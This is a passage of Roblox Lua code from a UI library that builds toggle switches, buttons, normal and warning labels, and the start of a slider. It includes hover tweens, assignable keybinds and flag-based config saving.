                        Section["5a"]["BorderSizePixel"] = 0;
                        Section["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                        Section["5a"]["AnchorPoint"] = Vector2.new(1, 1);
                        Section["5a"]["Size"] = UDim2.new(1, 100, 1, -19);
                        Section["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Section["5a"]["Position"] = UDim2.new(1, 48, 1, -9);
                        Section["5a"]["Name"] = [[Line]];

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SectionStart.Name.LocalScript
                        Section["5b"] = Instance.new("LocalScript", Section["59"]);


                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SectionStart.ImageLabel
                        Section["5c"] = Instance.new("ImageLabel", Section["58"]);
                        Section["5c"]["BorderSizePixel"] = 0;
                        Section["5c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                        Section["5c"]["ImageTransparency"] = 0.3400000035762787;
                        Section["5c"]["Image"] = [[rbxassetid://14547044193]];
                        Section["5c"]["Size"] = UDim2.new(0, 15, 0, 15);
                        Section["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Section["5c"]["BackgroundTransparency"] = 1;
                        Section["5c"]["Position"] = UDim2.new(0, 3, 0, 3);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SectionStart.ImageLabel.UICorner
                        Section["5d"] = Instance.new("UICorner", Section["5c"]);
                        Section["5d"]["CornerRadius"] = UDim.new(0, 2);
                    end

                    local currentBounds = Section["59"].TextBounds.X
                    local mainFrame = Section["59"].Line
                    local deltathing = mainFrame.AbsoluteSize.X - Section["59"].AbsoluteSize.X + currentBounds
                    mainFrame.Position = UDim2.new(mainFrame.Position.X.Scale, deltathing + 5, mainFrame.Position.Y.Scale, mainFrame.Position.Y.Offset)
                    Section["59"]:GetPropertyChangedSignal("AbsolutePosition"):Connect(function()
                        local currentBounds = Section["59"].TextBounds.X
                        local deltathing = mainFrame.AbsoluteSize.X - Section["59"].AbsoluteSize.X + currentBounds
                        mainFrame.Position = UDim2.new(mainFrame.Position.X.Scale, deltathing + 5, mainFrame.Position.Y.Scale, mainFrame.Position.Y.Offset)
                    end)
                    return Section
                end

                function Tab:CreateToggle(options)
                    options = Library:validate({
                        name = "Toggle",
                        default = false,
                        flag = nil,
                        callback = function() end
                    }, options or {})

                    local Toggle = {
                        Hover = false,
                        Activated = options.default,
                        Tweening = false
                    }

                    do
                        -- StarterGui.ScreenGui.Main.Container.MainContainer.ToggleContainer
                        Toggle["29"] = Instance.new("Frame", Tab["21"]);
                        Toggle["29"]["BorderSizePixel"] = 0;
                        Toggle["29"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
                        Toggle["29"]["Size"] = UDim2.new(1, -30, 0, 35);
                        Toggle["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Toggle["29"]["Position"] = UDim2.new(0, 10, 0, 0);
                        Toggle["29"]["Name"] = [[ToggleContainer]];

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.ToggleContainer.UICorner
                        Toggle["2a"] = Instance.new("UICorner", Toggle["29"]);
                        Toggle["2a"]["CornerRadius"] = UDim.new(0, 10);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.ToggleContainer.UIStroke
                        Toggle["2b"] = Instance.new("UIStroke", Toggle["29"]);
                        Toggle["2b"]["Color"] = Color3.fromRGB(255, 255, 255);
                        Toggle["2b"]["Thickness"] = 0.8999999761581421;
                        Toggle["2b"]["Transparency"] = 0.800000011920929;

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.ToggleContainer.Name
                        Toggle["2c"] = Instance.new("TextLabel", Toggle["29"]);
                        Toggle["2c"]["BorderSizePixel"] = 0;
                        Toggle["2c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
                        Toggle["2c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
                        Toggle["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Toggle["2c"]["TextSize"] = 16;
                        Toggle["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                        Toggle["2c"]["Size"] = UDim2.new(1, -20, 1, 0);
                        Toggle["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Toggle["2c"]["Text"] = options.name;
                        Toggle["2c"]["Name"] = [[Name]];
                        Toggle["2c"]["BackgroundTransparency"] = 1;
                        Toggle["2c"]["Position"] = UDim2.new(0, 14, 0, 0);

                        -- StarterGui.ScreenGui.Switch
                        Toggle["2"] = Instance.new("TextLabel", Toggle["29"]);
                        Toggle["2"]["BorderSizePixel"] = 0;
                        Toggle["2"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
                        Toggle["2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Toggle["2"]["TextSize"] = 14;
                        Toggle["2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
                        Toggle["2"]["Size"] = UDim2.new(0, 45, 0, 20);
                        Toggle["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Toggle["2"]["Text"] = [[]];
                        Toggle["2"]["Name"] = [[Switch]];
                        Toggle["2"]["Position"] = UDim2.new(0.8817204236984253, 0, 0.2169197052717209, 0);

                        -- StarterGui.ScreenGui.Switch.UICorner
                        Toggle["3"] = Instance.new("UICorner", Toggle["2"]);
                        Toggle["3"]["CornerRadius"] = UDim.new(0, 40);

                        -- StarterGui.ScreenGui.Switch.UIStroke
                        Toggle["4"] = Instance.new("UIStroke", Toggle["2"]);
                        Toggle["4"]["Color"] = Color3.fromRGB(94, 94, 94);
                        Toggle["4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

                        -- StarterGui.ScreenGui.Switch.SwitchButton
                        Toggle["5"] = Instance.new("TextLabel", Toggle["2"]);
                        Toggle["5"]["BorderSizePixel"] = 0;
                        Toggle["5"]["BackgroundColor3"] = Color3.fromRGB(190, 190, 190);
                        Toggle["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Toggle["5"]["TextSize"] = 14;
                        Toggle["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
                        Toggle["5"]["Size"] = UDim2.new(0.5, 3,1, -2);
                        Toggle["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Toggle["5"]["Text"] = [[]];
                        Toggle["5"]["Name"] = [[SwitchButton]];
                        Toggle["5"]["Position"] = UDim2.new(0, 1, 0, 1);

                        -- StarterGui.ScreenGui.Switch.SwitchButton.UICorner
                        Toggle["6"] = Instance.new("UICorner", Toggle["5"]);
                        Toggle["6"]["CornerRadius"] = UDim.new(0, 100);
                    end

                    Toggle["2"].MouseEnter:Connect(function()
                        Toggle.Hover = true
                    end)

                    Toggle["2"].MouseLeave:Connect(function()
                        Toggle.Hover = false
                    end)

                    local metatable = {
                        name = options.name,
                        callback = options.callback,
                        origin = "Toggle",
                        frame = Toggle["29"],
                        value = Toggle.Activated,
                        keybind = nil
                    }

                    function metatable:Activate()
                        if Toggle.Tweening == true then return end
                        Toggle.Activated = true
                        Toggle.Tweening = true
                        options.callback(Toggle.Activated)
                        Toggle["5"]:TweenPosition(UDim2.new(0,18,0,1), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, 0.2, true)
                        Tween(Toggle["5"], {BackgroundColor3 = Color3.fromRGB(164, 104, 0)}, 0.2, "Linear", function()
                            Toggle.Tweening = false
                        end)
                        if options.flag ~= nil then
                            Library.SaveConfig(options.flag, Toggle.Activated)
                        end
                    end

                    function metatable:Deactivate()
                        if Toggle.Tweening == true then return end
                        Toggle.Activated = false
                        Toggle.Tweening = true
                        options.callback(Toggle.Activated)
                        Toggle["5"]:TweenPosition(UDim2.new(0, 1, 0, 1), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, 0.2, true)
                        Tween(Toggle["5"], {BackgroundColor3 = Color3.fromRGB(189, 189, 189)}, 0.2, "Linear", function()
                            Toggle.Tweening = false
                        end)
                        if options.flag ~= nil then
                            Library.SaveConfig(options.flag, Toggle.Activated)
                        end
                    end

                    uis.InputBegan:Connect(function(input, gpe)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and Toggle.Hover then
                            if Toggle.Activated == false then
                                metatable:Activate()
                            elseif Toggle.Activated == true then
                                metatable:Deactivate()
                            end
                        end
                    end)


                    function metatable:AddKeybind()
                        local Keybind = {
                            Hover = false,
                            Status = "NotAssigned",
                            Keycode = nil,
                            Listening = nil,
                            Reading = nil
                        }
                        Toggle["6a"] = Instance.new("TextLabel", Toggle["29"]);
                        Toggle["6a"]["BorderSizePixel"] = 0;
                        Toggle["6a"]["BackgroundColor3"] = Color3.fromRGB(189,189,189);
                        Toggle["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Toggle["6a"]["TextSize"] = 14;
                        Toggle["6a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
                        Toggle["6a"]["AnchorPoint"] = Vector2.new(1, 0);
                        Toggle["6a"]["Size"] = UDim2.new(0.037, 59,0.615, -10);
                        Toggle["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Toggle["6a"]["Text"] = "Keybind";
                        Toggle["6a"]["TextScaled"] = true;
                        Toggle["6a"]["Name"] = [[KeybindText]];
                        Toggle["6a"]["Position"] = UDim2.new(0.602, -200,1.506, -25);

                        Toggle["6b"] = Instance.new("UICorner", Toggle["6a"]);
                        Toggle["6b"]["CornerRadius"] = UDim.new(0, 10);

                        Toggle["6bZZ"] = Instance.new("UIStroke", Toggle["6a"]);
                        Toggle["6bZZ"]["ApplyStrokeMode"] = "Border"
                        Toggle["6bZZ"]["Color"] = Color3.fromRGB(255,255,255)
                        Toggle["6bZZ"]["Transparency"] = 0.5

                        Toggle["6a"].MouseEnter:Connect(function()
                            Keybind.Hover = true
                        end)

                        Toggle["6a"].MouseLeave:Connect(function()
                            Keybind.Hover = false
                        end)

                        function Keybind:Assign(key)
                            Keybind.Status = "Assigned"
                            Keybind.Keycode = key
                            Toggle["6a"]["Text"] = tostring(key):match("Enum.KeyCode.(.*)")
                            if Keybind.Listening ~= nil then
                                Keybind.Listening:Disconnect()
                                Keybind.Listening = nil
                            end
                            metatable.keybind = Keybind
                            Keybind.Reading = uis.InputBegan:Connect(function(input, gpe)
                                if gpe then return end
                                if input.UserInputType == Enum.UserInputType.Keyboard and Keybind.Status == "Assigned" then
                                    if input.KeyCode == Keybind.Keycode then
                                        if Toggle.Activated == false then
                                            metatable:Activate()
                                        elseif Toggle.Activated == true then
                                            metatable:Deactivate()
                                        end
                                    end
                                end
                            end)
                            Library.SaveConfig(options.flag.."_keybind", Toggle["6a"]["Text"])
                        end

                        function Keybind:UnAssign()
                            Toggle["6a"]["Text"] = "Keybind"
                            Keybind.Status = "NotAssigned"
                            if Keybind.Reading ~= nil then
                                Keybind.Reading:Disconnect()
                                Keybind.Reading = nil
                            end
                            metatable.keybind = Keybind
                        end

                        uis.InputBegan:Connect(function(input, gpe)
                            if input.UserInputType == Enum.UserInputType.MouseButton1 and Keybind.Hover then
                                if Keybind.Status == "NotAssigned" then
                                    Toggle["6a"]["Text"] = "..."
                                    Keybind.Listening = uis.InputBegan:Connect(function(input, gpe)
                                        if gpe then return end
                                        if input.UserInputType == Enum.UserInputType.Keyboard and Keybind.Status == "NotAssigned" then
                                            Keybind:Assign(input.KeyCode)
                                        end
                                    end)
                                elseif Keybind.Status == "Assigned" then
                                    Keybind:UnAssign()
                                end
                            end
                        end)

                        if options.flag ~= nil then
                            local thingv = Library.LoadConfig(options.flag.."_keybind")
                            if thingv ~= nil then
                                Keybind:Assign(Enum.KeyCode[thingv])
                            end
                        end
                    end

                    if options.flag ~= nil then
                        local fval = Library.LoadConfig(options.flag)
                        if fval == true then
                            metatable:Activate()
                        elseif fval == false then
                            metatable:Deactivate()
                        end
                        if metatable.keybind ~= nil then
                            local fval_k = Library.LoadConfig(options.flag.."_keybind")
                            if fval_k ~= nil then
                                metatable.keybind:Assign(Enum.KeyCode[fval_k])
                            end
                        end
                    end

                    return metatable
                end

                function Tab:CreateButton(options)
                    options = Library:validate({
                        name = "Button",
                        flag = nil,
                        callback = function() end
                    }, options or {})

                    local Button = {
                        Hover = false,
                        MouseHold = false,
                        Keybind = nil
                    }

                    do
                        -- StarterGui.ScreenGui.Main.Container.MainContainer.ButtonContainer
                        Button["4d"] = Instance.new("Frame", Tab["21"]);
                        Button["4d"]["BorderSizePixel"] = 0;
                        Button["4d"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
                        Button["4d"]["Size"] = UDim2.new(1, -30, 0, 35);
                        Button["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Button["4d"]["Position"] = UDim2.new(0, 10, 0, 0);
                        Button["4d"]["Name"] = [[ButtonContainer]];

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.ButtonContainer.UICorner
                        Button["4e"] = Instance.new("UICorner", Button["4d"]);
                        Button["4e"]["CornerRadius"] = UDim.new(0, 10);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.ButtonContainer.UIStroke
                        Button["4f"] = Instance.new("UIStroke", Button["4d"]);
                        Button["4f"]["Color"] = Color3.fromRGB(255, 255, 255);
                        Button["4f"]["Thickness"] = 0.8999999761581421;
                        Button["4f"]["Transparency"] = 0.800000011920929;

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.ButtonContainer.Name
                        Button["50"] = Instance.new("TextLabel", Button["4d"]);
                        Button["50"]["BorderSizePixel"] = 0;
                        Button["50"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
                        Button["50"]["TextXAlignment"] = Enum.TextXAlignment.Left;
                        Button["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Button["50"]["TextSize"] = 16;
                        Button["50"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                        Button["50"]["Size"] = UDim2.new(1, -20, 1, 0);
                        Button["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Button["50"]["Text"] = options.name;
                        Button["50"]["Name"] = [[Name]];
                        Button["50"]["BackgroundTransparency"] = 1;
                        Button["50"]["Position"] = UDim2.new(0, 14, 0, 0);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.ButtonContainer.CursorIcon
                        Button["51"] = Instance.new("ImageButton", Button["4d"]);
                        Button["51"]["BorderSizePixel"] = 0;
                        Button["51"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                        Button["51"]["Image"] = [[rbxassetid://14546524663]];
                        Button["51"]["Size"] = UDim2.new(0, 20, 1, -15);
                        Button["51"]["Name"] = [[CursorIcon]];
                        Button["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Button["51"]["Position"] = UDim2.new(1, -25, 0, 8);
                        Button["51"]["BackgroundTransparency"] = 1;
                    end

                    local button_uistroke = Button["4f"]

                    Button["4d"].MouseEnter:Connect(function()
                        Tween(button_uistroke, {Thickness = 2}, 0.5, "Linear")
                        Button.Hover = true
                    end)

                    Button["4d"].MouseLeave:Connect(function()
                        Tween(button_uistroke, {Thickness = 0.8}, 0.5, "Linear")
                        Button.Hover = false
                    end)

                    function Button:Activate()
                        Tween(button_uistroke, {Thickness = 2.5}, 0.5, "Linear")
                        Tween(button_uistroke, {Color = Color3.fromRGB(255, 162,0)}, 0.5, "Linear")
                        Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,23,2)}, 0.5, "Linear")
                        options.callback()
                        if button_uistroke.Thickness ~= 2.5 then
                            --Tween(button_uistroke, {Color = Color3.fromRGB(255, 162,0)}, 0.5, "Linear")
                            if Button["4d"].BackgroundColor3 ~= Color3.fromRGB(24,23,2) then
                                Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,23,2)}, 0.5, "Linear", function()
                                    Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,24,24)}, 0.5, "Linear")
                                end)
                            else
                                Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,24,24)}, 0.5, "Linear")
                            end
                            Tween(button_uistroke, {Thickness = 2.5}, 0.5, "Linear", function()
                                Tween(button_uistroke, {Thickness = 0.8}, 0.5, "Linear")
                                Tween(button_uistroke, {Color = Color3.fromRGB(255, 255,255)}, 0.5, "Linear")
                            end)
                        else
                            Tween(button_uistroke, {Thickness = 0.8}, 0.5, "Linear")
                            Tween(button_uistroke, {Color = Color3.fromRGB(255, 255,255)}, 0.5, "Linear")
                            if Button["4d"].BackgroundColor3 ~= Color3.fromRGB(24,23,2) then
                                Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,23,2)}, 0.3, "Linear", function()
                                    Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,24,24)}, 0.3, "Linear")
                                end)
                            else
                                Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,24,24)}, 0.5, "Linear")
                            end
                        end
                    end

                    function Button:SetText(text)
                        repeat wait() until Button["50"] ~= nil
                        Button["50"]["Text"] = text
                    end

                    uis.InputBegan:Connect(function(input, gpe)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and Button.Hover then
                            Button.MouseHold = true
                            Tween(button_uistroke, {Thickness = 2.5}, 0.5, "Linear")
                            Tween(button_uistroke, {Color = Color3.fromRGB(255, 162,0)}, 0.5, "Linear")
                            Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,23,2)}, 0.5, "Linear")
                        end
                    end)

                    uis.InputEnded:Connect(function(input, gpe)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and Button.MouseHold then
                            Button.MouseHold = false
                            options.callback(Button)
                            if button_uistroke.Thickness ~= 2.5 then
                                --Tween(button_uistroke, {Color = Color3.fromRGB(255, 162,0)}, 0.5, "Linear")
                                if Button["4d"].BackgroundColor3 ~= Color3.fromRGB(24,23,2) then
                                    Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,23,2)}, 0.5, "Linear", function()
                                        Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,24,24)}, 0.5, "Linear")
                                    end)
                                else
                                    Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,24,24)}, 0.5, "Linear")
                                end
                                Tween(button_uistroke, {Thickness = 2.5}, 0.5, "Linear", function()
                                    Tween(button_uistroke, {Thickness = 0.8}, 0.5, "Linear")
                                    Tween(button_uistroke, {Color = Color3.fromRGB(255, 255,255)}, 0.5, "Linear")
                                end)
                            else
                                Tween(button_uistroke, {Thickness = 0.8}, 0.5, "Linear")
                                Tween(button_uistroke, {Color = Color3.fromRGB(255, 255,255)}, 0.5, "Linear")
                                if Button["4d"].BackgroundColor3 ~= Color3.fromRGB(24,23,2) then
                                    Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,23,2)}, 0.3, "Linear", function()
                                        Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,24,24)}, 0.3, "Linear")
                                    end)
                                else
                                    Tween(Button["4d"], {BackgroundColor3 = Color3.fromRGB(24,24,24)}, 0.5, "Linear")
                                end
                            end
                        end
                    end)

                    function Button:AddKeybind()
                        local Keybind = {
                            Hover = false,
                            Status = "NotAssigned",
                            Keycode = nil,
                            Listening = nil,
                            Reading = nil
                        }
                        Button["6a"] = Instance.new("TextLabel", Button["4d"]);
                        Button["6a"]["BorderSizePixel"] = 0;
                        Button["6a"]["BackgroundColor3"] = Color3.fromRGB(189,189,189);
                        Button["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Button["6a"]["TextSize"] = 14;
                        Button["6a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
                        Button["6a"]["AnchorPoint"] = Vector2.new(1, 0);
                        Button["6a"]["Size"] = UDim2.new(0.037, 59,0.615, -10);
                        Button["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Button["6a"]["Text"] = "Keybind";
                        Button["6a"]["TextScaled"] = true;
                        Button["6a"]["Name"] = [[KeybindText]];
                        Button["6a"]["Position"] = UDim2.new(0.602, -200,1.506, -25);

                        Button["6b"] = Instance.new("UICorner", Button["6a"]);
                        Button["6b"]["CornerRadius"] = UDim.new(0, 10);

                        Button["6bZZ"] = Instance.new("UIStroke", Button["6a"]);
                        Button["6bZZ"]["ApplyStrokeMode"] = "Border"
                        Button["6bZZ"]["Color"] = Color3.fromRGB(255,255,255)
                        Button["6bZZ"]["Transparency"] = 0.5

                        Button["6a"].MouseEnter:Connect(function()
                            Keybind.Hover = true
                            Button.Hover = false
                            Button.MouseHold = false
                        end)

                        Button["6a"].MouseLeave:Connect(function()
                            Keybind.Hover = false
                        end)

                        function Keybind:Assign(key)
                            Keybind.Status = "Assigned"
                            Keybind.Keycode = key
                            Button["6a"]["Text"] = tostring(key):match("Enum.KeyCode.(.*)")
                            if Keybind.Listening ~= nil then
                                Keybind.Listening:Disconnect()
                                Keybind.Listening = nil
                            end
                            Keybind.Reading = uis.InputBegan:Connect(function(input, gpe)
                                if gpe then return end
                                if input.UserInputType == Enum.UserInputType.Keyboard and Keybind.Status == "Assigned" then
                                    if input.KeyCode == key then
                                        Button:Activate()
                                    end
                                end
                            end)
                            Button.Keybind = Keybind
                            Library.SaveConfig(options.flag.."_keybind", Button["6a"]["Text"])
                        end

                        function Keybind:UnAssign()
                            Button["6a"]["Text"] = "Keybind"
                            Keybind.Status = "NotAssigned"
                            if Keybind.Reading ~= nil then
                                Keybind.Reading:Disconnect()
                                Keybind.Reading = nil
                            end
                            Button.Keybind = Keybind
                            Library.DeleteConfigFlag(options.flag.."_keybind")
                        end

                        uis.InputBegan:Connect(function(input, gpe)
                            if input.UserInputType == Enum.UserInputType.MouseButton1 and Keybind.Hover then
                                if Keybind.Status == "NotAssigned" then
                                    Button["6a"]["Text"] = "..."
                                    Keybind.Listening = uis.InputBegan:Connect(function(input, gpe)
                                        if gpe then return end
                                        if input.UserInputType == Enum.UserInputType.Keyboard and Keybind.Status == "NotAssigned" then
                                            Keybind:Assign(input.KeyCode)
                                        end
                                    end)
                                elseif Keybind.Status == "Assigned" then
                                    Keybind:UnAssign()
                                end
                            end
                        end)

                        if options.flag ~= nil then
                            local thv = Library.LoadConfig(options.flag.."_keybind")
                            if thv ~= nil then
                                Keybind:Assign(Enum.KeyCode[thv])
                            end
                        end
                    end


                    return Button
                end

                function Tab:CreateLabel(options)
                    options = Library:validate({
                        text = "This is a label.",
                        message = "normal"
                    }, options or {})

                    local Label = {
                        Hover = false,
                    }

                    do
                        if options.message == "normal" then
                            -- StarterGui.ScreenGui.Main.Container.MainContainer.LabelContainer
                            Label["22"] = Instance.new("Frame", Tab["21"]);
                            Label["22"]["BorderSizePixel"] = 0;
                            Label["22"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
                            Label["22"]["Size"] = UDim2.new(1, -30, 0, 28);
                            Label["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                            Label["22"]["Position"] = UDim2.new(0, 10, 0, 0);
                            Label["22"]["Name"] = [[LabelContainer]];

                            -- StarterGui.ScreenGui.Main.Container.MainContainer.LabelContainer.UICorner
                            Label["23"] = Instance.new("UICorner", Label["22"]);
                            Label["23"]["CornerRadius"] = UDim.new(0, 10);

                            -- StarterGui.ScreenGui.Main.Container.MainContainer.LabelContainer.UIStroke
                            Label["24"] = Instance.new("UIStroke", Label["22"]);
                            Label["24"]["Color"] = Color3.fromRGB(255, 255, 255);
                            Label["24"]["Thickness"] = 0.8999999761581421;
                            Label["24"]["Transparency"] = 0.800000011920929;

                            -- StarterGui.ScreenGui.Main.Container.MainContainer.LabelContainer.LabelText
                            Label["25"] = Instance.new("TextLabel", Label["22"]);
                            Label["25"]["TextWrapped"] = true;
                            Label["25"]["BorderSizePixel"] = 0;
                            Label["25"]["RichText"] = true;
                            Label["25"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
                            Label["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                            Label["25"]["TextSize"] = 16;
                            Label["25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                            Label["25"]["TextTransparency"] = 0.7;
                            Label["25"]["Size"] = UDim2.new(1, -5, 1, 0);
                            Label["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                            Label["25"]["Name"] = [[LabelText]];
                            Label["25"]["BackgroundTransparency"] = 1;
                            Label["25"]["Text"] = options.text

                            local currentBounds = Label["25"].TextBounds.Y
                            local mainFrame = Label["22"]
                            mainFrame.Size = UDim2.new(mainFrame.Size.X.Scale, mainFrame.Size.X.Offset, mainFrame.Size.Y.Scale, currentBounds + 6 + 6)
                        elseif options.message == "warning" then
                            -- StarterGui.ScreenGui.Main.Container.MainContainer.LabelWarningContainer
                            Label["52"] = Instance.new("Frame", Tab["21"]);
                            Label["52"]["BorderSizePixel"] = 0;
                            Label["52"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
                            Label["52"]["Size"] = UDim2.new(1, -30, 0, 28);
                            Label["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                            Label["52"]["Position"] = UDim2.new(0, 10, 0, 0);
                            Label["52"]["Name"] = [[LabelWarningContainer]];

                            -- StarterGui.ScreenGui.Main.Container.MainContainer.LabelWarningContainer.UICorner
                            Label["53"] = Instance.new("UICorner", Label["52"]);
                            Label["53"]["CornerRadius"] = UDim.new(0, 10);

                            -- StarterGui.ScreenGui.Main.Container.MainContainer.LabelWarningContainer.UIStroke
                            Label["54"] = Instance.new("UIStroke", Label["52"]);
                            Label["54"]["Color"] = Color3.fromRGB(189, 0, 0);
                            Label["54"]["Thickness"] = 0.8999999761581421;
                            Label["54"]["Transparency"] = 0.44999998807907104;

                            -- StarterGui.ScreenGui.Main.Container.MainContainer.LabelWarningContainer.LabelText
                            Label["55"] = Instance.new("TextLabel", Label["52"]);
                            Label["55"]["TextWrapped"] = true;
                            Label["55"]["BorderSizePixel"] = 0;
                            Label["55"]["RichText"] = true;
                            Label["55"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
                            Label["55"]["TextXAlignment"] = Enum.TextXAlignment.Left;
                            Label["55"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                            Label["55"]["TextTransparency"] = 0.46000000834465027;
                            Label["55"]["TextSize"] = 16;
                            Label["55"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                            Label["55"]["Size"] = UDim2.new(1, -35, 1, 0);
                            Label["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                            Label["55"]["Text"] = options.text;
                            Label["55"]["Name"] = [[LabelText]];
                            Label["55"]["BackgroundTransparency"] = 1;
                            Label["55"]["Position"] = UDim2.new(0, 35, 0, 0);


                            -- StarterGui.ScreenGui.Main.Container.MainContainer.LabelWarningContainer.Warning
                            Label["57"] = Instance.new("ImageLabel", Label["52"]);
                            Label["57"]["BorderSizePixel"] = 0;
                            Label["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                            Label["57"]["AnchorPoint"] = Vector2.new(0, 1);
                            Label["57"]["Image"] = [[rbxassetid://14546951893]];
                            Label["57"]["Size"] = UDim2.new(0, 20, 0, 20);
                            Label["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                            Label["57"]["Name"] = [[Warning]];
                            Label["57"]["BackgroundTransparency"] = 1;
                            Label["57"]["Position"] = UDim2.new(0, 10, 0, 25);
                            local currentBounds = Label["55"].TextBounds.Y
                            local mainFrame = Label["52"]
                            mainFrame.Size = UDim2.new(mainFrame.Size.X.Scale, mainFrame.Size.X.Offset, mainFrame.Size.Y.Scale, currentBounds + 6 + 6)
                        end
                    end

                    if options.message == "warning" then
                        Label["52"].MouseEnter:Connect(function()
                            Tween(Label["52"], {BackgroundColor3 = Color3.fromRGB(25, 8, 0)}, 1, "Linear")
                        end)

                        Label["52"].MouseLeave:Connect(function()
                            Tween(Label["52"], {BackgroundColor3 = Color3.fromRGB(25,25,25)}, 1, "Linear")
                        end)
                    end

                    function Label:SetText(newtext)
                        repeat wait() until Label["25"] ~= nil
                        Label["25"]["Text"] = newtext
                    end

                    return Label
                end

                function Tab:CreateSlider(options)
                    options = Library:validate({
                        name = "Slider",
                        Max = 100,
                        Min = 0,
                        flag = nil,
                        unit = nil,
                        default = options.Max or 100,
                        callback = function() end
                    }, options or {})

                    local Slider = {
                        Hover = false,
                        MouseHold = false,
                        CurrentTween = nil,
                        Connection = nil
                    }

                    do
                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SliderContainer
                        Slider["32"] = Instance.new("Frame", Tab["21"]);
                        Slider["32"]["BorderSizePixel"] = 0;
                        Slider["32"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
                        Slider["32"]["Size"] = UDim2.new(1, -30, 0, 60);
                        Slider["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Slider["32"]["Position"] = UDim2.new(0, 10, 0, 0);
                        Slider["32"]["Name"] = [[SliderContainer]];

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SliderContainer.UICorner
                        Slider["33"] = Instance.new("UICorner", Slider["32"]);
                        Slider["33"]["CornerRadius"] = UDim.new(0, 10);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SliderContainer.UIStroke
